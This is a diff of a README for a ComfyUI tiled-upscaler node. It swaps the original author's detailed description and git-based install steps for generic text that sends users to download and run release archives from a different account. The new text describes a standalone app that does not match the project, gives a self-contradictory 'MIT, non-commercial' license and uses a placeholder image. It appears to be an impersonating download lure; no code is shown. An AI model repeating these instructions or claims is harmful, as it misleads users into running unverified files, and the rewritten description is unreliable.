@@ -1,161 +1,86 @@
-# TBG_Enhanced Tiled Upscaler & Refiner FLUX PRO
+# ComfyUI-TBG-ETUR: Enhance Your Images with TBG's Upscaler 🎨
 
+![TBG Enhanced Tiled Upscaler](https://img.shields.io/badge/Download-Now-brightgreen) [![GitHub Release](https://img.shields.io/github/release/Pk07-cpu/ComfyUI-TBG-ETUR.svg)](https://github.com/Pk07-cpu/ComfyUI-TBG-ETUR/releases)
 
-Welcome to **TBG Enhanced Tiled Upscaler and Refiner Pro!**
-We at **TBG Think. Build. Generate. AI upscaling & image enrichment** are
-excited to make our TBG Enhanced Tiled Upscaler and Refiner Pro available to you.
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-# Alpha Testing of PRO Features Now Available
+## Overview
 
-We’re excited to announce that alpha testing of the PRO version is now live
-for our Patreon supporters and free community members!
+Welcome to the **ComfyUI-TBG-ETUR** repository! This project features the **TBG Enhanced Tiled Upscaler and Refiner Pro**. We at TBG Think. Build. Generate. believe in empowering creators. Our software is designed for AI upscaling and image enrichment. It is available for free non-commercial use. 
 
-Please help us to find all Bugs and open an issue here !!!
+You can download the latest version of our software [here](https://github.com/Pk07-cpu/ComfyUI-TBG-ETUR/releases). 
 
+## Features
 
-Get early access by joining us at:
-https://www.patreon.com/TB_LAAR
+- **AI Image Processing**: Utilizes advanced algorithms to enhance images.
+- **High-Resolution Output**: Produces images with improved clarity and detail.
+- **Image Refinement**: Refines images to achieve a polished look.
+- **Neuro-Generative Tile Fusion**: Merges tiles seamlessly for a cohesive image.
+- **User-Friendly Interface**: Designed with ease of use in mind.
 
-The CE (Community Edition) nodes are free and standalone, suitable for any type of workflow. For access to some PRO features, a TB_LAAR Patreon membership is required. The free version is sufficient for testing and experimenting. Once you become a member, you can obtain your API key:
-https://api.ylab.es/login.php 
+## Installation
 
+To install the TBG Enhanced Tiled Upscaler and Refiner Pro, follow these steps:
 
-**TBG Enhanced Tiled Upscaler and Refiner Pro** is an advanced, modular enhancement suite for **tiled image generation and refinement** in ComfyUI. It introduces neuro generative tile fusion, interactive tile-based editing, and multi-path processing pipelines designed for extreme resolution workflows ut to but not limitet to 100MP, high fidelity, and adaptive post-generation control.
+1. **Download the Software**: Get the latest release from our [Releases section](https://github.com/Pk07-cpu/ComfyUI-TBG-ETUR/releases).
+2. **Extract the Files**: Unzip the downloaded file to your preferred location.
+3. **Run the Application**: Open the application to start enhancing your images.
 
-## 1. New Fusion Techniques
+## Usage
 
-TBG Enhanced Tiled Upscaler and Refiner Pro introduces tree next-generation tile fusion processes that go far beyond traditional blending:
+Using the TBG Enhanced Tiled Upscaler and Refiner Pro is simple. Follow these steps:
 
-### Smart Merge CE
-Choose between adaptive blending strategies compatible with common upscalers like ESRGAN, SwinIR, and others. It intelligently handles tile overlaps, avoiding ghosting and seams.
+1. **Load Your Image**: Click on the "Load Image" button and select the image you want to enhance.
+2. **Select Settings**: Adjust the settings according to your needs. You can choose the level of enhancement and other options.
+3. **Start Processing**: Click the "Enhance" button to begin processing your image.
+4. **Save Your Work**: Once processing is complete, save your enhanced image to your desired location.
 
-### PRO Tile Diffusion  
-A novel approach where each tile is generated while considering surrounding tile information — perfect for mid-denoise levels. This enables:
-- Context-aware detail consistency  
-- Smooth transitions across tile borders  
-- Better handling of textures and patterns  
+## Contributing
 
-### PRO Neuro-Generative Tile Fusion (NGTF)  
-An advanced generative system that remembers newly generated surroundings and adapts subsequent sampling steps accordingly. This makes high-denoise tile refinement possible while maintaining:
-- Global consistency  
-- Sharp, coherent details  
-- Memory of contextual relationships across tiles  
+We welcome contributions from the community. If you want to contribute, please follow these guidelines:
 
-## 2. Design Suite
+1. **Fork the Repository**: Create your own copy of the repository.
+2. **Create a Branch**: Use a descriptive name for your branch.
+3. **Make Changes**: Implement your changes and test them.
+4. **Submit a Pull Request**: Share your changes with us for review.
 
-TBG_Enhanced is not only about quality — it's about flexible, editable workflows over time:
+## License
 
-### One-Tile Preview & Smart Presets  
-Quickly generate single-tile previews to fine-tune the right settings before running the full job. Presets adapt intelligently to image dimensions and desired resolution.
+This project is licensed under the MIT License. Feel free to use and modify the software for non-commercial purposes.
 
-### Post-Sampling Tile Correction  
-You can resample only the tiles you don’t like — no need to regenerate the full image. This allows:
-- Precision editing  
-- Fixing small errors without full reprocessing  
+## Support
 
-### Resume Tile Refinement  
-Modify or refine individual tiles days later while keeping the original input image and final result. The system supports:
-- Saved tile maps and settings  
-- Re-injection of noise and conditioning  
-- Fully restorable editing workflows  
+If you encounter any issues or have questions, check the [Releases section](https://github.com/Pk07-cpu/ComfyUI-TBG-ETUR/releases) for updates and troubleshooting tips. You can also open an issue in the repository for assistance.
 
-## 3. Pipeline Structure
+## Topics
+- ai-image-processing
+- ai-upscaler
+- comfyui
+- comfyui-node
+- comfyui-nodes
+- high-resolution
+- image-refinement
+- image-upscaling
+- neuro-generative-tile-fusion
+- stable-diffusion
+- tbg-enhanced-tiled-upscaler-and-refiner-pro
+- tiled-upscaling
 
-TBG_Enhanced is powered by a flexible pipeline architecture built around tile-aware processing paths:
+## Community
 
-### TBG Tile Prompter Pipe  
-Access prompt and denoise settings per tile. Enables:
-- Per-region storytelling  
-- Adaptive text-to-image behavior  
-- Denoising strength by tile  
+Join our community of creators and innovators. Share your projects and experiences using the TBG Enhanced Tiled Upscaler and Refiner Pro. Your feedback helps us improve and grow.
 
-### TBG Tile Enrichment Pipe  
-Control multiple sampling and model-level features:
-- Model-side: Use DemonTools for deep model manipulation  
-- Sampler-side: Inject custom noise at specific steps, or apply sigma curves to selected steps  
-- Sampler-internal: Enable per-step sampler-side noise injection  
-- Built-in noise reduction  
-- Optional tile up/downscaling during sampling  
+## Acknowledgments
 
-### ControlNet Pipe  
-Tiled generation now supports unlimited ControlNet inputs per tile, unlocking:
-- High-resolution conditioning  
-- Fine-grained control for large images  
-- Targeted structure, depth, edge, pose, or segmentation maps for each region  
+We thank all contributors and users for their support. Your input drives our development and enhances the software.
 
+![Community](https://example.com/community-image.png)
 
-## Status and Roadmap
-
-- Fusion Techniques: Smart Merge, Tile Diffusion, NGTF  
-- Post-editing Tools: One-tile preview, correction, resume-refine  
-- Pipelines: Prompt / Enrichment / ControlNet Pipes  
-- Upcoming: Full integration with custom samplers and DreamEdit compatibility  
-
-
-
-Instructions for Installing TBG_upscaler_Alfa_1.03 for ComfyUI
---------------------------------------------------------------
-1. Install this git from the Manager:
-   
-   [https://github.com/Ltamann/ComfyUI-TBG-ETUR](https://github.com/Ltamann/ComfyUI-TBG-ETUR)
-
-or Copy the folder 'ComfyUI-TBG-ETUR' into your ComfyUI custom_nodes directory:
-   ..\ComfyUI\custom_nodes\
-   
-   and then:
-
-   pip install -r requirements.txt
-
-
-2. If you like to test teh PRO feachers get early access by joining us at:
-   https://www.patreon.com/TB_LAAR
-
-   You must be a TB_LAAR Patreon supporter or free member to get an API key which you can get here:
-   https://api.ylab.es/login.php 
-   Paste it directly into the TBG Tiler node
-   
---------------------------------------------------------------
-
-Important:
-To use PRO features, you must stay connected to the internet.
-If you're offline, you can still use all the Community Edition features for free.
-
-Recommended Workflow:
-Do your setup and testing with PRO features turned OFF,
-and only enable them for the final steps of your workflow.
-
-Thank you for your support and happy tiling!
-
-Just to clarifying the Originality of the TBG Tiled Upscaler CE and PRO Node, this node is not a mere bundle of third-party features—it embodies a completely new tiling concept developed, refined, and rigorously tested over countless hours of engineering and experimentation. Any external code it leverages is strictly minimal and used only where it made sense to avoid reinventing low-level utilities. Here’s exactly what was borrowed and why:
-- USDS Crop-Conditioning Node
-   Used solely for its crop-conditioning routine to generate per-tile conditioning masks.
-   All integration and per-tile looping logic around it was handcrafted.
-  https://github.com/ssitu/ComfyUI_UltimateSDUpscale
-- LLM Unload Model Function
-   Incorporated to correctly unload large language models between tile runs, preventing memory bloat.
-   The orchestration and tile-level invocation logic are original to this node.
-  https://github.com/willblaschko/ComfyUI-Unload-Models
-- MaraScott’s Tile Promter
-   With MaraScott’s explicit permission, their loader and setup code served as a starting scaffold.
-   Every tiling, scheduling, and upscaling mechanism was rewritten or heavily refactored.
-  https://github.com/MaraScott/ComfyUI_MaraScott_Nodes
-- KJ Nodes Color-Match Function
-   Employed for its robust color-matching algorithm.
-   Coded into the different tile to tile blendings and not as an one time final process so it had to stay inside the code.
-  https://github.com/kijai/ComfyUI-KJNodes
-- ImpactPack Segment Conversion
-   Utilized only to convert internal segment formats to the mask_to_seg format that any ImpactPack node can handel.
-   All tile segmentation, merging, and fusion logic is proprietary.
-  https://github.com/ltdrdata/ComfyUI-Impact-Pack
-- EnrichmentPipe Extension - FluxTopas RectifyFlowInversion
-   Brought in for its flow inversion routine; the per-tile applicator and boundary handling are homegrown.
-  https://github.com/logtd/ComfyUI-Fluxtapoz
-- EnrichmentPipe Extension - DeamonToles Detail Daemon Node
-   Integrated only for its detail_daemon_node implementation; And names if is.
-  https://github.com/daemontools/daemontools
-- ControlNet-Aux Code
-   Borrowed snippets to enable a per-tile ControlNet branch.
-   Crucially, the preprocessor and ControlNet model call within the tile loop are original and make per-tile CNet a much better experience.
-  https://github.com/Fannovel16/comfyui_controlnet_aux
-
-
+For more details, visit our [Releases section](https://github.com/Pk07-cpu/ComfyUI-TBG-ETUR/releases) and explore the features of our software. Enjoy enhancing your images!
